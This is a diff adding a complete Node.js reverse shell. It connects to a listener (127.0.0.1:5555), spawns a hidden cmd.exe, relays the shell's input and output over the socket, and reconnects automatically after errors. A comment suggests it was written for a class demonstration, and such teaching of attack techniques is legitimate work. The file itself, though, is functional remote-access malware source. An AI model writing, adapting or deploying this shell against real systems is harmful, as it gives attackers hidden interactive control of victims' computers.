@@ -1,0 +1,60 @@
+const net = require('net');
+const { spawn } = require('child_process');
+
+// Create a more reliable reverse shell
+(function connectShell() {
+    try {
+        console.log('Attempting to connect to listener...');
+        const client = new net.Socket();
+        
+        // Connect to the listener
+        client.connect(5555, '127.0.0.1', () => {
+            console.log('Connected to listener at 127.0.0.1:5555');
+            
+            // Spawn an interactive shell
+            const shell = spawn('cmd.exe', ['/K'], {
+                windowsHide: true,
+                shell: true
+            });
+            
+            // Set up data forwarding
+            shell.stdout.on('data', (data) => {
+                client.write(data);
+            });
+            
+            shell.stderr.on('data', (data) => {
+                client.write(data);
+            });
+            
+            client.on('data', (data) => {
+                shell.stdin.write(data);
+            });
+            
+            // Handle various closing events properly
+            shell.on('exit', () => {
+                console.log('Shell process exited');
+                client.end();
+            });
+            
+            client.on('error', (err) => {
+                console.log(`Connection error: ${err}`);
+                setTimeout(connectShell, 5000); // Try to reconnect after error
+            });
+            
+            client.on('close', () => {
+                console.log('Connection closed');
+                shell.kill();
+                // Don't immediately reconnect - let the class see what happened
+            });
+        });
+        
+        client.on('error', (err) => {
+            console.log(`Failed to connect: ${err.message}`);
+            // Try to reconnect after a delay
+            setTimeout(connectShell, 5000);
+        });
+    } catch (err) {
+        console.log(`General error: ${err.message}`);
+        setTimeout(connectShell, 5000);
+    }
+})();
